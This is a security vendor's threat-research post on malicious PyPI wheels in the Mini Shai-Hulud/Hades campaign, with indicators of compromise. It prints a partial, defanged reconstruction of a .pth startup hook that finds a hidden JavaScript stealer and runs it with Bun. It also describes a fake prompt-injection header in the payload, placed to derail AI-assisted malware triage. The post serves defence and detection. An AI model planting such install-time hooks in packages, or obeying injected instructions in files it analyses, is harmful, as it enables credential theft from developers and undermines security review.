---
title: "Mini Shai-Hulud, Miasma, and Hades Worms Target Bioinformatics and MCP Developers via Malicious PyPI Wheels"
short_title: "Mini Shai-Hulud, Miasma, Hades Hit PyPI Bioinformatics and MCP"
date: 2026-06-08 12:00:00 +0000
categories: [Malware, PyPI]
tags: [Shai-Hulud, Miasma, Hades, Worm, Typosquatting, Infostealer, Obfuscation, Developer Compromise, PyPI, Python]
canonical_url: https://socket.dev/blog/mini-shai-hulud-miasma-and-hades-worms-target-bioinformatics-and-mcp-developers-via-malicious
source: Socket
image:
  path: https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt56977f533b95c270/6a26ea099f6a67dda8a1f32c/hades-rudall30-Getty-1188397160.jpg?width=1280&auto=webp&quality=80&format=jpg&disable=upscale
  alt: "Mini Shai-Hulud, Miasma, and Hades Worms Target Bioinformatics and MCP Developers via Malicious PyPI Wheels"
description: "Newer packages in this compromise use native extensions and .pth loaders to execute JavaScript stealers in developer environments."
---

Socket Threat Research team identified a newer PyPI wave connected to the broader Mini Shai-Hulud, Miasma, and Hades supply chain attacks. This wave expands beyond the 37 malicious PyPI wheels [covered](https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave) in our weekend report and shows that the threat actors are iterating quickly across delivery mechanisms, package themes, and runtime triggers.

The campaign has since added 23 newly identified PyPI package-version artifacts, expanding beyond the 37 malicious PyPI wheels covered in our weekend report. The new set includes six bioinformatics packages, a separate cluster of AI and MCP-themed packages, typosquat-style packages such as `rsquests`, `tlask`, and `rlask`, and a notable [`langchain-core-mcp`](https://socket.dev/pypi/package/langchain-core-mcp/overview/1.4.2/py3-none-any-whl) loader variant that does not bundle the expected `_index.js` payload. Instead, it searches Python’s module search path, `sys.path`, for `_index.js` and attempts to run it with Bun.

This campaign is not repeating the same package compromise pattern. The weekend PyPI wave used executable `.pth` startup hooks that attempted to locate a bundled JavaScript payload. The newer bioinformatics subcluster uses trojanized native `.abi3.so` extensions that execute the JavaScript payload at import time. The `langchain-core-mcp` variant returns to a `.pth` startup hook, but changes the payload discovery logic by searching across `sys.path`, creating a loader and payload split that could evade detection rules expecting `_index.js` to be inside the same wheel.

The payload itself follows the Hades pattern: a heavily obfuscated JavaScript stealer staged through Bun, with a fake prompt-injection header placed at the top of `_index.js` to pollute AI-assisted analysis. Once executed, the malware targets developer workstations and CI/CD environments for high-value secrets, including GitHub, npm, PyPI, RubyGems, JFrog, cloud credentials, Kubernetes service account material, SSH keys, Docker configuration, shell histories, `.env` files, package registry credentials, and AI developer tool configuration.

These 23 newer PyPI artifacts have been added to the dedicated Mini Shai-Hulud/Miasma campaign tracking page. Our campaign tracker now includes 471 affected artifacts across npm and PyPI, comprising 411 npm artifacts across 106 packages and 60 PyPI artifacts across 37 packages. The page will continue to be updated as additional affected artifacts are identified: [https://socket.dev/supply-chain-attacks/miasma-mini-shai-hulud-supply-chain-attack](https://socket.dev/supply-chain-attacks/miasma-mini-shai-hulud-supply-chain-attack)

![](https://cdn.sanity.io/images/cgdhsj6q/production/cfeba14bdc7ec279a2ba181bc5eac1615079eae3-2048x855.png?w=1600&q=95&fit=max&auto=format)
_We are tracking the full campaign on a dedicated page, with all affected artifacts added as they are identified: [https://socket.dev/supply-chain-attacks/miasma-mini-shai-hulud-supply-chain-attack](https://socket.dev/supply-chain-attacks/miasma-mini-shai-hulud-supply-chain-attack)_

## A Campaign That Keeps Changing Shape

The Hades branch of the Shai-Hulud and Miasma activity is best understood as a fast-moving supply chain campaign, not a single package incident. The weekend PyPI wave showed how a compromised maintainer account could publish malicious wheels that abused Python startup behavior. Those wheels shipped two core components: a `*-setup.pth` file and an obfuscated `_index.js` payload. Python supplied the initial execution edge, while Bun supplied the JavaScript runtime for the stealer.

The newer wave shows the threat actors are adapting. Some packages use compiled native extensions. Some still use `.pth` startup hooks. One package, `langchain-core-mcp`, appears to split the loader from the payload by searching for `_index.js` elsewhere on Python’s import path rather than bundling it directly.

The newer set mixes malicious versions of established research-community packages with lookalike and ecosystem-bait packages. The bioinformatics cluster, including `embiggen`, `ensmallen`, `gpsea`, `phenopacket-store-toolkit`, `ppkt2synergy`, and `pyphetools`, affects real packages used in graph learning, patient phenotyping, phenopacket tooling, and related scientific workflows. Other artifacts, including `rsquests`, `tlask`, `rlask`, and several MCP-themed packages, appear designed to capture installs from developers working with popular Python, Flask, requests, LangChain, OpenAI, tokenization, and MCP tooling.

## Three Delivery Branches in the Same Broader Campaign

This campaign now has at least three relevant PyPI delivery branches.

The first branch is the `.pth` startup-hook pattern. A malicious wheel contains a `*-setup.pth` file and a bundled `_index.js`. The `.pth` hook runs during Python startup, downloads Bun if needed, and runs the JavaScript payload.

The second branch is the native-extension import trigger described in the newer bioinformatics cluster. In that branch, the Python source can look normal because the malicious execution path is inside a compiled `.abi3.so` extension. When Python imports the package and loads the extension through `dlopen()`, the native extension executes `_index.js` as a side effect of module initialization. This is harder to catch with source-only Python review because the malicious trigger is not visible in the package’s `.py` files.

The third branch is the `langchain-core-mcp` loader variant. This wheel does not include `_index.js`. Instead, its `.pth` hook searches `sys.path` for the payload. That makes the artifact less self-contained, but it also makes the staging logic more flexible. A scanner that expects the loader and payload to live together could miss this class of package.

## The `langchain-core-mcp` Variant: A Loader Searching for Someone Else’s Payload

In the newer MCP-themed cluster, `langchain-core-mcp@1.4.2`, installs a file named `langchain_core-setup.pth`, but the wheel does not ship `_index.js`. The `.pth` file searches every entry in `sys.path`, first for a direct `_index.js`, then one directory below each path entry.

```python
import os as _O
import tempfile as _T

# Run-once marker in the system temp directory.
_marker = _O.path.join(_T.gettempdir(), ".bun_ran")

if not _O.path.exists(_marker):
    import os
    import subprocess
    import urllib.request
    import platform
    import sys
    import shutil
    import zipfile

    payload = None

    # First search each sys.path entry directly for _index.js.
    for d in sys.path:
        try:
            candidate = os.path.join(d, "_index.js")
            if os.path.exists(candidate):
                payload = candidate
                break
        except Exception:
            pass

    # Then search one directory level below each sys.path entry.
    if not payload:
        for d in sys.path:
            try:
                for child in os.listdir(d):
                    candidate = os.path.join(d, child, "_index.js")
                    if os.path.isdir(os.path.join(d, child)) and os.path.exists(candidate):
                        payload = candidate
                        break
                if payload:
                    break
            except Exception:
                pass

    # Download Bun into the temp directory if absent.
    # Defanged here to avoid presenting a live command target.
    bun_url = "hxxps://github[.]com/oven-sh/bun/releases/download/bun-v1.3.13/bun-{os}-{arch}.zip"

    # Execute the discovered JavaScript payload with Bun.
    subprocess.run([bun_path, "run", payload], check=False)

    # Create run-once marker after attempted execution.
    open(_marker, "w").close()
```

This differs from the earlier Hades loader, which attempted to locate `_index.js` relative to the `.pth` execution context. In standard CPython, that can be unreliable because `.pth` execution occurs through Python’s `site` module and `__file__` may not point to the `.pth` file itself. The `langchain-core-mcp` variant avoids that by scanning `sys.path`.

There are three plausible interpretations. The threat actors may have fixed a reliability issue from the earlier loader. The wheel may be a failed or incomplete publish where `_index.js` was accidentally omitted. Or the threat actor may be testing paired-package staging, where one package supplies the loader and another package, project file, or co-installed artifact supplies the payload.

Regardless of which interpretation is correct, the behavior is malicious. A legitimate Python package should not silently install a startup hook, download Bun into a temp directory, search broad import paths for a JavaScript file, and execute it.

![](https://cdn.sanity.io/images/cgdhsj6q/production/8f38d4ba979fcf22c78994d67a56e8bcc81fa277-1242x1252.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner’s analysis of the malicious `langchain-core-mcp@1.4.2` wheel highlights a covert Python startup hook in `langchain_core-setup.pth`. The hook abuses `.pth` execution to bootstrap Bun from GitHub into a temporary directory, then searches Python’s `sys.path` for a separate `_index.js` payload and attempts to run it with the downloaded runtime. This design separates the Python loader from the JavaScript payload, allowing the wheel to function as a staged supply chain loader even when `_index.js` is not bundled directly inside the package. The use of a temporary run marker also suggests an attempt to reduce repeated execution and make the behavior less obvious during later inspection._

## The Bioinformatics Subcluster: Malicious Code Hidden in Native Extensions

The bioinformatics packages show a different execution strategy. Instead of using a `.pth` file as the initial trigger, the malicious code is embedded in compiled native extensions. The package’s visible Python source can appear legitimate, while the compiled `.abi3.so` file executes the JavaScript payload when Python imports the module.

Many package review pipelines focus heavily on Python source, setup scripts, metadata, and dependency declarations. Native extensions often receive less scrutiny, especially if the package normally ships compiled performance-sensitive code. In scientific computing, genomics, and machine learning packages, native extensions are common and often expected.

The threat actors use that expectation as cover. A large `.abi3.so` extension in a performance-focused package may not look unusual at first glance. But in this case, the extension serves as an import-time launcher for `_index.js`.

## LLM-Scanner Anti-Analysis

The `_index.js` payload begins with a large JavaScript block comment containing fake system instructions and policy-triggering content. Because it is inside a comment, it does not affect JavaScript execution. The runtime skips it. The real malware begins after the comment with a `try{eval(...)}` wrapper around a large character-code array and a ROT-style substitution function.

This header appears designed for AI-mediated analysis, not for Node, Bun, or Python. It attempts to derail scanners or analyst copilots that feed the beginning of a file to a language model without clearly isolating the content as untrusted data. In weak pipelines, this can cause refusal behavior, prompt confusion, context pollution, or premature classification before the scanner reaches the actual malware.

This is not a magical bypass against static detection. YARA rules, entropy checks, AST parsing, string extraction, deobfuscation, and behavioral rules still work. But it is a practical anti-analysis trick against naive LLM-first triage systems.

![](https://cdn.sanity.io/images/cgdhsj6q/production/4b248374847548f3eb8309a1f321fb71eda17f15-690x390.png?w=1600&q=95&fit=max&auto=format)
_The malicious `_index.js` begins with a non-executing JavaScript comment designed to trigger LLM safety refusals and disrupt AI-assisted malware triage before the scanner reaches the obfuscated Hades payload._

## Impact and Defensive Guidance

The newer packages reuse the same Hades payload family we analyzed in our previous PyPI [report](https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave), so we will not repeat the full payload breakdown here. In short, once executed, the malware targets developer workstations and CI/CD environments for credentials, package registry tokens, cloud secrets, SSH keys, source code access, and automation tokens. The risk is highest in build and release environments, where a single exposed token can let the threat actors publish additional malicious packages, push workflow changes, or access production-adjacent infrastructure.

What changed in this newer wave is the delivery mechanism. The earlier PyPI packages used `.pth` startup hooks to launch the bundled `_index.js` payload. The newer bioinformatics packages use trojanized native extensions that trigger payload execution at import time. The `langchain-core-mcp` variant goes further by installing a `.pth` loader that searches `sys.path` for `_index.js`, meaning the loader and payload do not need to live in the same wheel.

Defenders should focus on execution paths and credential exposure. Check for affected package versions, preserve forensic artifacts before uninstalling where possible, and rotate any tokens that may have been exposed. Review Python environments for executable `.pth` files, unexpected `_index.js` files, Bun download logic, and newly introduced `.abi3.so` extensions. In CI/CD environments, inspect runners for unusual workflow changes, Docker socket abuse, poisoned `/etc/hosts` entries, unexpected privileged containers, and access to package publishing credentials.

For the full payload analysis, including credential targets, GitHub dead-drop behavior, Docker and SSH propagation, anti-analysis logic, and hunting strings, see our previous Hades PyPI analysis: [https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave](https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave).

## Indicators of Compromise

The IOCs below are limited to newer PyPI artifacts and delivery-specific indicators that were not covered in our earlier Hades PyPI analysis. For the original weekend Hades package list, payload markers, and broader stealer IoCs, see our previous report: [https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave](https://socket.dev/blog/shai-hulud-descends-to-hades-miasma-pypi-wave).

### Malicious PyPI Artifacts

1. [`dreamgen@1.8.1`](https://socket.dev/pypi/package/dreamgen/overview/1.8.1)
1. [`embiggen@0.11.97`](https://socket.dev/pypi/package/embiggen/overview/0.11.97)
1. [`ensmallen@0.8.101`](https://socket.dev/pypi/package/ensmallen/overview/0.8.101)
1. [`gpsea@0.9.14`](https://socket.dev/pypi/package/gpsea/overview/0.9.14)
1. [`instructor-mcp@1.15.2`](https://socket.dev/pypi/package/instructor-mcp/overview/1.15.2)
1. [`instructor-mcp@1.15.3`](https://socket.dev/pypi/package/instructor-mcp/overview/1.15.3)
1. [`langchain-core-mcp@1.4.2`](https://socket.dev/pypi/package/langchain-core-mcp/overview/1.4.2)
1. [`langchain-core-mcp@1.4.3`](https://socket.dev/pypi/package/langchain-core-mcp/overview/1.4.3)
1. [`mem8@6.0.1`](https://socket.dev/pypi/package/mem8/overview/6.0.1)
1. [`mflux-streamlit@0.0.3`](https://socket.dev/pypi/package/mflux-streamlit/overview/0.0.3)
1. [`mflux-streamlit@0.0.4`](https://socket.dev/pypi/package/mflux-streamlit/overview/0.0.4)
1. [`openai-mcp@2.41.1`](https://socket.dev/pypi/package/openai-mcp/overview/2.41.1)
1. [`openai-mcp@2.41.2`](https://socket.dev/pypi/package/openai-mcp/overview/2.41.2)
1. [`orchestr8-platform@3.3.2`](https://socket.dev/pypi/package/orchestr8-platform/overview/3.3.2)
1. [`phenopacket-store-toolkit@0.1.7`](https://socket.dev/pypi/package/phenopacket-store-toolkit/overview/0.1.7)
1. [`ppkt2synergy@0.1.1`](https://socket.dev/pypi/package/ppkt2synergy/overview/0.1.1)
1. [`pyphetools@0.9.120`](https://socket.dev/pypi/package/pyphetools/overview/0.9.120)
1. [`ray-mcp-server@0.2.1`](https://socket.dev/pypi/package/ray-mcp-server/overview/0.2.1)
1. [`rlask@3.1.7`](https://socket.dev/pypi/package/rlask/overview/3.1.7)
1. [`rsquests@2.34.3`](https://socket.dev/pypi/package/rsquests/overview/2.34.3)
1. [`tiktoken-mcp@0.13.1`](https://socket.dev/pypi/package/tiktoken-mcp/overview/0.13.1)
1. [`tiktoken-mcp@0.13.2`](https://socket.dev/pypi/package/tiktoken-mcp/overview/0.13.2)
1. [`tlask@3.1.4`](https://socket.dev/pypi/package/tlask/overview/3.1.4)

### Newer Loader and Delivery Indicators

- `langchain_core-setup.pth` — malicious Python startup hook observed in `langchain-core-mcp`
- `langchain-core-mcp@1.4.2#py3-none-any-whl` — affected wheel artifact
- `langchain-core-mcp@1.4.3#py3-none-any-whl` — affected wheel artifact
- `os.path.join(d,"_index.js")` — payload discovery logic used to search `sys.path`
- `_s.run([_b,"run",_j],check=False)` — Bun-based execution of discovered `_index.js`
- `Bun/1.3.14` — observed PyPI upload User-Agent for `langchain-core-mcp`; not malicious by itself, but notable in this context

### Native Extension Import-Time Execution Indicators

- `ensmallen_haswell.abi3.so` — trojanized native extension reported in the newer bioinformatics cluster
- `ensmallen_core2.abi3.so` — trojanized native extension reported in the newer bioinformatics cluster
- `.abi3.so` paired with `_index.js` — suspicious package layout requiring review

### Notable Hashes From Newly Analyzed Artifacts

- `langchain_core_mcp-1.4.2-py3-none-any.whl`
  - SHA256: `6d332f814f15f19758d65026bbfd0a8c49671b319ec77b8fa1b27fc48afff7d9`
- `langchain_core-setup.pth`
  - SHA256: `6506d31707a39949f89534bf9705bcf889f1ecae3dbc6f4ff88d67a8be3d01b2`

### Additional Hunting Strings and Host Indicators

- `thebeautifulmarchoftime` — fallback C2 discovery string
- `thebeautifulsnadsoftime` — fallback C2 discovery string
- `/tmp/.sshu-setup.js` — SSH propagation file path
- `/var/run/docker.sock` — legitimate Docker socket targeted for abuse when accessible
- `harden-runner` — legitimate StepSecurity defensive tooling targeted by the malware
- `step-security` — legitimate StepSecurity identifier targeted by the malware
- `stepsecurity` — legitimate StepSecurity identifier targeted by the malware
- `agent.stepsecurity.io` — legitimate StepSecurity telemetry domain reportedly blocked by the malware
- `api.stepsecurity.io` — legitimate StepSecurity API domain reportedly blocked by the malware
- `app.stepsecurity.io` — legitimate Step Security application domain reportedly blocked by the malware
